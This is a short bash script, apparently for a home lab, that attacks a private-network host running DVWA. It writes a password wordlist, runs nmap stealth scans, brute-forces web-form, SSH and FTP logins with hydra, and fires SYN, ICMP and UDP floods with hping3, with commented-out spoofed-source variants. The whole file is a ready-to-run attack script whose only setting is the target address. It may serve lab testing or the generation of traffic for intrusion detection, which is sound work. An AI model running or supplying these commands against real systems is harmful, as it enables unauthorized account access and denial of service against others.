#!/bin/bash

TARGET="192.168.122.109"
USERNAME="fruitto"
WORDLIST="wordlist_test.txt"

cat <<EOF >$WORDLIST
123456
password
admin123
qwerty
root123
111111
letmein
wrongpass1
wrongpass2
wrongpass3
P@ssword
rootroot
EOF

# Port Scan
sudo nmap -sS $TARGET
sudo nmap -sN $TARGET
sudo nmap -sX $TARGET

# Brute Force Attack
hydra -l $USERNAME -P $WORDLIST $TARGET http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect." -V -o brute_results.txt
hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V
hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V

# Syn Flood (DoS)
# sudo hping3 -S -i u100 -p 80 --rand-source -c 10000 $TARGET
sudo hping3 -S -i u100 -p 80 -c 50000 $TARGET
# ICMP Flood (DoS)
# sudo hping3 --icmp -i u100 -d 1400 --rand-source -c 50000 $TARGET
sudo hping3 --icmp -i u100 -d 1400 -c 50000 $TARGET
# UDP Flood (DoS)
# sudo hping3 --udp -i u100 -p 53 --rand-source -d 1000 -c 50000 $TARGET
sudo hping3 --udp -i u100 -p 53 -d 1000 -c 50000 $TARGET

rm $WORDLIST

